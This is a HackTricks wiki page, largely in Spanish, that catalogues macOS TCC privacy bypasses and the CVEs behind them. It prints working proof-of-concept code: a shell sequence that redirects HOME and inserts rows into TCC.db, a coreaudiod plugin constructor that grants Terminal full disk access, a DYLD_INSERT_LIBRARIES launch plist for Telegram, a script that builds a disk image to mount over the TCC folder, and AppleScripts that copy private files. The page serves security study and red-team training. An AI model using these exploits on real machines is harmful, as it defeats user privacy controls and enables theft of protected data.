# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## Por funcionalidad

### Bypass de escritura

Esto no es un bypass, es solo cómo funciona TCC: **No protege contra la escritura**. Si Terminal **no tiene acceso para leer el Escritorio de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** se añade al nuevo **archivo** para dar acceso a la **aplicación creadora** para leerlo.

### TCC ClickJacking

Es posible **poner una ventana sobre el aviso de TCC** para hacer que el usuario **lo acepte** sin darse cuenta. Puedes encontrar un PoC en [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Solicitud de TCC por nombre arbitrario

El atacante puede **crear aplicaciones con cualquier nombre** (por ejemplo, Finder, Google Chrome...) en el **`Info.plist`** y hacer que solicite acceso a alguna ubicación protegida por TCC. El usuario pensará que la aplicación legítima es la que está solicitando este acceso.\
Además, es posible **eliminar la aplicación legítima del Dock y poner la falsa en su lugar**, de modo que cuando el usuario haga clic en la falsa (que puede usar el mismo ícono) podría llamar a la legítima, pedir permisos de TCC y ejecutar un malware, haciendo que el usuario crea que la aplicación legítima solicitó el acceso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Más información y PoC en:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### Bypass de SSH

Por defecto, un acceso a través de **SSH solía tener "Acceso Completo al Disco"**. Para deshabilitar esto, necesitas tenerlo listado pero deshabilitado (eliminarlo de la lista no eliminará esos privilegios):

![](<../../../../../.gitbook/assets/image (1077).png>)

Aquí puedes encontrar ejemplos de cómo algunos **malwares han podido eludir esta protección**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Ten en cuenta que ahora, para poder habilitar SSH necesitas **Acceso Completo al Disco**
{% endhint %}

### Manejo de extensiones - CVE-2022-26767

El atributo **`com.apple.macl`** se otorga a los archivos para dar a una **cierta aplicación permisos para leerlo.** Este atributo se establece al **arrastrar y soltar** un archivo sobre una aplicación, o cuando un usuario **hace doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.

Por lo tanto, un usuario podría **registrar una aplicación maliciosa** para manejar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (por lo que el archivo malicioso obtendrá acceso para leerlo).

### iCloud

El derecho **`com.apple.private.icloud-account-access`** permite comunicarse con el servicio XPC **`com.apple.iCloudHelper`** que **proporcionará tokens de iCloud**.

**iMovie** y **Garageband** tenían este derecho y otros que lo permitían.

Para más **información** sobre la explotación para **obtener tokens de iCloud** de ese derecho, consulta la charla: [**#OBTS v5.0: "¿Qué sucede en tu Mac, se queda en el iCloud de Apple?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatización

Una aplicación con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras aplicaciones**. Esto significa que podría **abusar de los permisos otorgados a las otras aplicaciones**.

Para más información sobre Apple Scripts, consulta:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por ejemplo, si una aplicación tiene **permiso de Automatización sobre `iTerm`**, por ejemplo, en este caso **`Terminal`** tiene acceso sobre iTerm:

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene FDA, puede llamar a iTerm, que sí lo tiene, y usarlo para realizar acciones:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Over Finder

O si una aplicación tiene acceso a Finder, podría ser un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamiento de la aplicación

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El **daemon tccd** de usuario estaba utilizando la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) y debido a que el daemon TCC se ejecuta a través de `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** pasadas a él.\
Así, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para apuntar a un **directorio controlado**, **reiniciar** el **daemon TCC**, y luego **modificar directamente la base de datos de TCC** para otorgarse **todos los derechos de TCC disponibles** sin nunca solicitar al usuario final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Notas tenía acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se **crea en una ubicación no protegida**. Así que podrías pedirle a notas que copie un archivo protegido en una nota (así que en una ubicación no protegida) y luego acceder al archivo:

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocación

El binario `/usr/libexec/lsd` con la biblioteca `libsecurity_translocate` tenía el derecho `com.apple.private.nullfs_allow`, lo que le permitía crear un **nullfs** mount y tenía el derecho `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.

Era posible agregar el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y luego se mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`** donde todos los documentos dentro de Library podrían ser **accedidos**.

### CVE-2023-38571 - Música y TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Música`** tiene una característica interesante: Cuando está en funcionamiento, **importará** los archivos que se suelten en **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** en la "biblioteca de medios" del usuario. Además, llama a algo como: **`rename(a, b);`** donde `a` y `b` son:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Este comportamiento de **`rename(a, b);`** es vulnerable a una **Condición de Carrera**, ya que es posible colocar dentro de la carpeta `Automatically Add to Music.localized` un archivo **TCC.db** falso y luego, cuando se crea la nueva carpeta (b) para copiar el archivo, eliminarlo y apuntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="path/folder"`** significa básicamente que **cualquier base de datos abierta se copia a esa ruta**. En este CVE, este control fue abusado para **escribir** dentro de una **base de datos SQLite** que va a ser **abierta por un proceso con FDA la base de datos TCC**, y luego abusar de **`SQLITE_SQLLOG_DIR`** con un **symlink en el nombre del archivo** para que cuando esa base de datos esté **abierta**, el usuario **TCC.db se sobrescriba** con la que se abrió.\
**Más info** [**en el informe**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **y**[ **en la charla**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Si la variable de entorno **`SQLITE_AUTO_TRACE`** está configurada, la biblioteca **`libsqlite3.dylib`** comenzará a **registrar** todas las consultas SQL. Muchas aplicaciones usaron esta biblioteca, por lo que era posible registrar todas sus consultas SQLite.

Varias aplicaciones de Apple usaron esta biblioteca para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Esta **variable de entorno es utilizada por el marco `Metal`** que es una dependencia de varios programas, notablemente `Music`, que tiene FDA.

Configurando lo siguiente: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Si `path` es un directorio válido, el error se activará y podemos usar `fs_usage` para ver qué está sucediendo en el programa:

* se abrirá un archivo `open()`, llamado `path/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
* uno o más `write()` escribirán el contenido en el archivo (no controlamos esto)
* `path/.dat.nosyncXXXX.XXXXXX` será renombrado a `path/name`

Es una escritura de archivo temporal, seguida de un **`rename(old, new)`** **que no es seguro.**

No es seguro porque tiene que **resolver las rutas antiguas y nuevas por separado**, lo que puede llevar algo de tiempo y puede ser vulnerable a una condición de carrera. Para más información, puedes consultar la función `renameat_internal()` de `xnu`.

{% hint style="danger" %}
Entonces, básicamente, si un proceso privilegiado está renombrando desde una carpeta que controlas, podrías obtener un RCE y hacer que acceda a un archivo diferente o, como en este CVE, abrir el archivo que la aplicación privilegiada creó y almacenar un FD.

Si el renombrado accede a una carpeta que controlas, mientras has modificado el archivo fuente o tienes un FD a él, cambias el archivo (o carpeta) de destino para apuntar a un symlink, así puedes escribir cuando quieras.
{% endhint %}

Este fue el ataque en el CVE: Por ejemplo, para sobrescribir el `TCC.db` del usuario, podemos:

* crear `/Users/hacker/ourlink` para apuntar a `/Users/hacker/Library/Application Support/com.apple.TCC/`
* crear el directorio `/Users/hacker/tmp/`
* establecer `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* activar el error ejecutando `Music` con esta variable de entorno
* capturar el `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X es aleatorio)
* aquí también `open()` este archivo para escritura, y mantener el descriptor de archivo
* cambiar atómicamente `/Users/hacker/tmp` con `/Users/hacker/ourlink` **en un bucle**
* hacemos esto para maximizar nuestras posibilidades de éxito ya que la ventana de carrera es bastante estrecha, pero perder la carrera tiene un inconveniente negligible
* esperar un poco
* probar si tuvimos suerte
* si no, ejecutar de nuevo desde el principio

Más info en [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Ahora, si intentas usar la variable de entorno `MTL_DUMP_PIPELINES_TO_JSON_FILE`, las aplicaciones no se lanzarán.
{% endhint %}

### Apple Remote Desktop

Como root podrías habilitar este servicio y el **agente ARD tendrá acceso completo al disco** que luego podría ser abusado por un usuario para hacer que copie una nueva **base de datos de usuario TCC**.

## Por **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario logra reiniciar TCC con una variable de entorno $HOME apuntando a una **carpeta diferente**, el usuario podría crear una nueva base de datos TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para otorgar cualquier permiso TCC a cualquier aplicación.

{% hint style="success" %}
Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** para el **valor de `$HOME`**, así que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción con un bypass de TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la **carpeta HOME** del usuario.

1. Obtener un blob _csreq_ para la aplicación objetivo.
2. Plantar un archivo _TCC.db_ falso con acceso requerido y el blob _csreq_.
3. Exportar la entrada de Servicios de Directorio del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificar la entrada de Servicios de Directorio para cambiar el directorio home del usuario.
5. Importar la entrada de Servicios de Directorio modificada con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detener el _tccd_ del usuario y reiniciar el proceso.

El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, un atacante podría especificar un **Bundle personalizado para cargar**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** de cambiar el directorio home del usuario con una **inyección de código de configd**.

Para más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Por inyección de proceso

Existen diferentes técnicas para inyectar código dentro de un proceso y abusar de sus privilegios TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Además, la inyección de proceso más común para eludir TCC encontrada es a través de **plugins (cargar biblioteca)**.\
Los plugins son código extra, generalmente en forma de bibliotecas o plist, que serán **cargados por la aplicación principal** y se ejecutarán bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (a través de permisos o derechos otorgados), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el derecho **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con extensión **`.daplug`** y **no tenía el** runtime endurecido.

Para armar este CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del derecho anterior) para poder **apoderarse de la base de datos TCC del usuario** para eludir TCC.

Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los derechos `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permitiendo inyección de código** y el segundo otorgándole acceso para **gestionar TCC**.

Este binario permitía cargar **plugins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos TCC** con este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Complementos de Capa de Abstracción de Dispositivo (DAL)

Las aplicaciones del sistema que abren el flujo de cámara a través de Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **en el proceso estos complementos** ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringido por SIP).

Simplemente almacenar allí una biblioteca con el **constructor** común funcionará para **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación Firefox tenía los derechos `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para más información sobre cómo explotar esto fácilmente [**consulta el informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los derechos **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código dentro del proceso y usar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los derechos **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de ello para **obtener acceso a sus permisos** como grabar con la cámara. Puedes [**encontrar la carga útil en el informe**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota cómo usar la variable env para cargar una biblioteca, se creó un **plist personalizado** para inyectar esta biblioteca y se usó **`launchctl`** para lanzarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Por invocaciones abiertas

Es posible invocar **`open`** incluso mientras está en sandbox

### Scripts de Terminal

Es bastante común dar acceso completo al disco (**FDA**) a la terminal, al menos en computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** con ello.

Los scripts **`.terminal`** son archivos plist como este con el comando a ejecutar en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y lanzarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount\_apfs TCC bypass y escalada de privilegios

**Cualquier usuario** (incluso los no privilegiados) puede crear y montar un snapshot de Time Machine y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga acceso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser concedido por un administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montar sobre el archivo TCC

Incluso si el archivo de la base de datos TCC está protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar todo el disco y montarlo en otro lugar eludiendo las protecciones de TCC.

### Location Services

Hay una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** para indicar los clientes permitidos para **acceder a los servicios de ubicación**.\
La carpeta **`/var/db/locationd/` no estaba protegida contra el montaje de DMG** por lo que era posible montar nuestro propio plist.

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

En varias ocasiones, los archivos almacenarán información sensible como correos electrónicos, números de teléfono, mensajes... en ubicaciones no protegidas (lo que cuenta como una vulnerabilidad en Apple).

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Esto ya no funciona, pero [**sí funcionó en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Otra forma usando [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
